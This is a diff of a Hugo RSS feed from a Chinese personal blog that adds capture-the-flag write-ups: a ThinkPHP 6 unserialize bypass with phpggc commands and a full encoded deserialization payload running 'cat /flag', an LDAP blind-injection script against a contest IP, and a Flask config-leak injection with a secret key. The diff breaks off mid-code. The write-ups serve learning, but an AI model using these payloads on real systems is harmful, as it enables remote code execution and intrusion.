@@ -6,7 +6,7 @@
         <description>Recent content on 茄子的养殖场</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Thu, 12 May 2022 20:53:12 +0800</lastBuildDate><atom:link href="https://proben1.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 12 May 2022 23:31:13 +0800</lastBuildDate><atom:link href="https://proben1.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>茄科生物观测日志</title>
         <link>https://proben1.github.io/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97/</link>
         <pubDate>Mon, 06 Dec 2021 12:08:35 +0800</pubDate>
@@ -93,6 +93,51 @@
 &lt;p&gt;好好学习！打游戏可以再造个自己去玩？&lt;/p&gt;
 &lt;p&gt;（昨天素材太好了，忍不住记一下，详见2021-12-05）&lt;/p&gt;
 </description>
+        </item>
+        <item>
+        <title>[安洵杯2019]iamthinking</title>
+        <link>https://proben1.github.io/2022/%E5%AE%89%E6%B4%B5%E6%9D%AF2019iamthinking/</link>
+        <pubDate>Thu, 12 May 2022 23:31:13 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2022/%E5%AE%89%E6%B4%B5%E6%9D%AF2019iamthinking/</guid>
+        <description>&lt;p&gt;www.zip源码泄露，Thinkphp6.0，代码在app/controller/Index.php&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
+&lt;span style=&#34;color:#ff79c6&#34;&gt;namespace&lt;/span&gt; app\controller;
+&lt;span style=&#34;color:#ff79c6&#34;&gt;use&lt;/span&gt; app\BaseController;
+
+&lt;span style=&#34;color:#ff79c6&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;Index&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;extends&lt;/span&gt; BaseController
+{
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;index&lt;/span&gt;()
+    {
+        
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;img src=&amp;#39;../test.jpg&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/&amp;gt;&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;];
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt;))
+        {
+            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;REQUEST_URI&amp;#39;&lt;/span&gt;]);
+            parse_str(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;query&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$query&lt;/span&gt;);
+            &lt;span style=&#34;color:#ff79c6&#34;&gt;foreach&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$query&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$value&lt;/span&gt;)
+            {
+                &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/^O/i&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$value&lt;/span&gt;))
+                {
+                    &lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;STOP HACKING&amp;#39;&lt;/span&gt;);
+                    &lt;span style=&#34;color:#ff79c6&#34;&gt;exit&lt;/span&gt;();
+                }
+            }
+            unserialize(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$paylaod&lt;/span&gt;);
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;parse_url()&lt;/p&gt;
+&lt;p&gt;1.//upload?如果是//，则被解析成host, 后面的内容如果有/,被解析出path，而不是query了&lt;/p&gt;
+&lt;p&gt;2.如果path部分为///，则解析错误&lt;/p&gt;
+&lt;p&gt;工具：https://github.com/wh1t3p1g/phpggc&lt;/p&gt;
+&lt;p&gt;使用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;./phpggc -l
+./phpggc -u ThinkPHP/RCE2  &amp;#39;system(&amp;#34;cat /flag&amp;#34;);&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A200%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000079ea1027000000003c8828b6%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
         </item>
         <item>
         <title>离谱与webshell</title>
@@ -1872,105 +1917,235 @@ session_start();
 </description>
         </item>
         <item>
-        <title>刷题2</title>
-        <link>https://proben1.github.io/2021/%E5%88%B7%E9%A2%982/</link>
+        <title>2021DNUICTF,wp</title>
+        <link>https://proben1.github.io/2021/2021dnuictfwp/</link>
+        <pubDate>Sat, 04 Dec 2021 19:00:12 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2021/2021dnuictfwp/</guid>
+        <description>&lt;h3 id=&#34;web&#34;&gt;WEB&lt;/h3&gt;
+&lt;h2 id=&#34;签到-flag&#34;&gt;[签到] flag&lt;/h2&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/6240221b27f86abb2a94cb25.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/6240221b27f86abb2a94cb25.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;凑齐20位，召唤flag&lt;/p&gt;
+&lt;p&gt;ZmxhZ3tuc3NfbG9naW59&lt;/p&gt;
+&lt;p&gt;base64解码&lt;/p&gt;
+&lt;p&gt;flag{nss_login}&lt;/p&gt;
+&lt;h2 id=&#34;萌odd_upload&#34;&gt;[萌]odd_upload&lt;/h2&gt;
+&lt;p&gt;Smarty&lt;/p&gt;
+&lt;p&gt;ssti模板注入，文件覆盖&lt;/p&gt;
+&lt;p&gt;自己找个Smarty版本，对比目录着传&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/6240222727f86abb2a951589.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/6240222727f86abb2a951589.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;访问index.php&lt;/p&gt;
+&lt;h2 id=&#34;easyinject&#34;&gt;easyinject&lt;/h2&gt;
+&lt;p&gt;通过报错发现是ldap&lt;/p&gt;
+&lt;p&gt;现学一波，没学明白&lt;/p&gt;
+&lt;p&gt;LDAP查询语法&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;search语法：attribute operator value
+search filter options:( &amp;#34;&amp;amp;&amp;#34; or &amp;#34;|&amp;#34; (filter1) (filter2) (filter3) ...) (&amp;#34;!&amp;#34; (filter))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是题目原因，可以通过布尔盲注来确定用户名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; requests
+
+url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;http://47.106.172.144:2333&amp;#39;&lt;/span&gt;
+
+flag, done &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;LDAP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ff79c6&#34;&gt;False&lt;/span&gt;
+&lt;span style=&#34;color:#ff79c6&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;not&lt;/span&gt; done:
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#bd93f9&#34;&gt;127&lt;/span&gt;):
+        payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; flag &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(j) &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;
+        data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;: payload, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;123&amp;#39;&lt;/span&gt;}
+        r &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get(url, params&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;data)
+        
+        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;密码错误&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; r&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;查询用户不唯一&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; r&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text:
+            flag &lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(j)
+            &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(flag)
+            &lt;span style=&#34;color:#ff79c6&#34;&gt;break&lt;/span&gt;
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;:
+        done &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;True&lt;/span&gt;
+
+&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; flag&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;lower() &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还就跑出来了&lt;/p&gt;
+&lt;h3 id=&#34;misc&#34;&gt;MISC&lt;/h3&gt;
+&lt;h2 id=&#34;签到签到&#34;&gt;[签到]签到&lt;/h2&gt;
+&lt;p&gt;flag{Dnui_ctf_2021_s1gn_in}&lt;/p&gt;
+&lt;h2 id=&#34;萌新在哪呢&#34;&gt;[萌新]在哪呢&lt;/h2&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/6240223127f86abb2a955642.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/6240223127f86abb2a955642.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;ctrl+f&lt;/p&gt;
+&lt;h2 id=&#34;只是个png别想太多了png&#34;&gt;只是个PNG，别想太多了.png&lt;/h2&gt;
+&lt;p&gt;binwalk一分，010一看&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://pic.imgdb.cn/item/6240223e27f86abb2a95aced.png&#34; &gt;
+		&lt;img src=&#34;https://pic.imgdb.cn/item/6240223e27f86abb2a95aced.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;crypto&#34;&gt;CRYPTO&lt;/h3&gt;
+&lt;h2 id=&#34;签到键盘侠&#34;&gt;[签到]键盘侠&lt;/h2&gt;
+&lt;p&gt;UYTGBNM EDCV UYTGBNM TGBUHM YTFVBH QAZXCDE TYUHN EDCTGBF RFVYGN&lt;/p&gt;
+&lt;p&gt;flag{} 提交时括号内为大写字母&lt;/p&gt;
+&lt;p&gt;键盘画图&lt;/p&gt;
+&lt;p&gt;CLCKOUTHK&lt;/p&gt;
+&lt;h2 id=&#34;萌新素数&#34;&gt;[萌新]素数&lt;/h2&gt;
+&lt;p&gt;10个不重复的长度&amp;gt;=1024bits的素数&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; gmpy2
+&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; gmpy2 &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; mpz
+
+rs &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; gmpy2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;random_state()
+
+&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;gen_prime&lt;/span&gt;():
+    p &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; gmpy2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;mpz_urandomb(rs, &lt;span style=&#34;color:#bd93f9&#34;&gt;1024&lt;/span&gt;)
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;not&lt;/span&gt; gmpy2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;is_prime(p):
+        p &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; gmpy2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;add(p, &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;)
+    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; p
+
+&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;100&lt;/span&gt;):
+    p &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; gen_prime()
+    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(p)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;多弄几遍，有时候生成的数不是309位整数&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>[FBCTF2019]Event</title>
+        <link>https://proben1.github.io/2021/fbctf2019event/</link>
         <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
         
-        <guid>https://proben1.github.io/2021/%E5%88%B7%E9%A2%982/</guid>
-        <description>&lt;h1 id=&#34;p5461-赦免战俘&#34;&gt;P5461 赦免战俘&lt;/h1&gt;
-&lt;p&gt;心态小裂，写了n遍，最后发现循环里忘加x，y了&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;())
-b &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a)] &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a)]
-l &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a
-&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;func&lt;/span&gt;(l,x,y):
-    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; l &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt; :
-        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; 
+        <guid>https://proben1.github.io/2021/fbctf2019event/</guid>
+        <description>&lt;h2 id=&#34;fbctf2019event&#34;&gt;[FBCTF2019]Event&lt;/h2&gt;
+&lt;p&gt;flask&lt;/p&gt;
+&lt;p&gt;没想到在event_important有注入&lt;/p&gt;
+&lt;p&gt;猜它可能大概想这样&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;name &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; event_name
+address &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; event_address
+&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(event_important)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;event_name=1&amp;amp;event_address=1&amp;amp;event_important=__class__.__init__.__globals__[app].config
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是查到秘钥&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;解密，出现的是字符串，不是json&lt;/p&gt;
+&lt;p&gt;加密&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; flask &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; Flask
+&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; flask.sessions &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; SecureCookieSessionInterface
 
-    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(x,x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)) :
-        &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(y,y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)) :
-            b[i][j] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;
-    
-    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),y)
-    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x,y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;))
